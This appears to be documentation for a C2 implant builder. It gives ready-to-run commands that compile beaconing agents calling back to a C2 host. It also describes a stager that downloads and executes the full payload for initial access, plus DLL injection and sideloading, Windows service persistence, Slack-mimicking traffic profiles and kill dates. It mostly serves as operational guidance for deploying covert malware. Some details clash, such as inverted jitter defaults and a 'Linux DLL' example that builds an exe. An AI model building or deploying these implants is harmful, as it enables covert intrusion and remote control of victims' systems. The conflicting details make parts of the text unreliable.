# Builder Guide

The builder compiles agent binaries with embedded configuration, crypto keys, and malleable profiles.

## Basic Usage

```bash
cargo run --bin builder -- \
  --host 10.0.0.1 \
  --port 4443 \
  --platform linux \
  --transport tls \
  --sleep 30 \
  --jitter-min 10 \
  --jitter-max 20
```

## Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--host` | `127.0.0.1` | C2 server address |
| `--port` | `4443` | C2 server port (or pipe name for named_pipe) |
| `--platform` | `linux` | Target: `linux`, `windows`, `macos` |
| `--transport` | `tls` | Transport: `tls`, `tcp_plain`, `named_pipe`, `http`, `https` |
| `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager` |
| `--profile` | `default` | Built-in profile: `default`, `http_post`, `http_image` |
| `--profile-file` | — | Path to custom malleable profile JSON |
| `--fallback-file` | — | Path to fallback endpoints JSON |
| `--sleep` | `40` | Beacon interval in seconds |
| `--jitter-min` | `20` | Minimum jitter percentage |
| `--jitter-max` | `10` | Maximum jitter percentage |
| `--bloat` | `0` | Add N megabytes of padding to increase binary size |
| `--debug` | `false` | Enable debug output on the agent |
| `--days` | `0` | Kill date: agent self-destructs after N days (0 = never) |

## Output Formats

### EXE (default)
Standard executable. Run directly or via any execution method.

### DLL
Exports `DllMain`. On `DLL_PROCESS_ATTACH`, spawns the agent on a new thread. Use with:
- `rundll32.exe agent.dll,DllMain`
- Reflective DLL injection
- DLL sideloading

### Service
Windows service binary. Register with:
```
sc create RCMAgent binPath= "C:\path\to\service.exe"
sc start RCMAgent
```

### Stager
Minimal downloader (~50KB). Fetches the full agent from `/stage/<build_id>` on the C2 server, writes to temp, executes, cleans up. Good for initial access where payload size matters.

## Examples

HTTPS agent through corporate proxy:
```bash
cargo run --bin builder -- \
  --host c2.example.com --port 443 \
  --transport https --platform windows \
  --profile-file traffic_profiles/slack_api.json \
  --fallback-file fallback_profiles/corporate_proxy.json \
  --sleep 60 --days 30
```

Linux DLL with short beacon:
```bash
cargo run --bin builder -- \
  --host 10.0.0.1 --port 4443 \
  --transport tls --platform linux \
  --format exe --sleep 5
```
